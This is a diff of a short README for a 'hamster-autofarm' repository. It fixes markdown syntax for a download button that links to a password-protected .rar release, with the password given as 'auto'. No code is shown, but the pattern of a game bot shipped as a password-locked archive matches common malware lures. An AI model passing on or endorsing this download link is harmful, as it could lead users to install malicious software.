@@ -1,6 +1,6 @@
 # hamster-autofarm
 
-![[Download](https://github.com/tugasdogda36/hamster-autofarm/assets/169678529/974245ac-17d2-46bf-a15e-d67084dd157b)](https://github.com/tugasdogda36/hamster-autofarm/releases/download/autofarmer-v1.2.4/Hamster.autofarm.rar)
+[![Download](https://github.com/tugasdogda36/hamster-autofarm/assets/169678529/974245ac-17d2-46bf-a15e-d67084dd157b)](https://github.com/tugasdogda36/hamster-autofarm/releases/download/autofarmer-v1.2.4/Hamster.autofarm.rar)
 * Password - auto
 
 
